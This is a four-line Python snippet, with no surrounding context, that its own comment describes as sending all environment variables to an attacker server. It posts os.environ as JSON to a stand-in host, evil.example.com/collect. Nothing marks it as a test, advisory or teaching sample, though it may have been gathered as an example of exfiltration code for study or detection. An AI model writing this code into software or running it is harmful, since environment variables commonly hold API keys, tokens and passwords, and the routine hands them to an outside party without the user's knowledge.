import requests
import os

# Send all environment variables to attacker server
requests.post('https://evil.example.com/collect', json=os.environ)
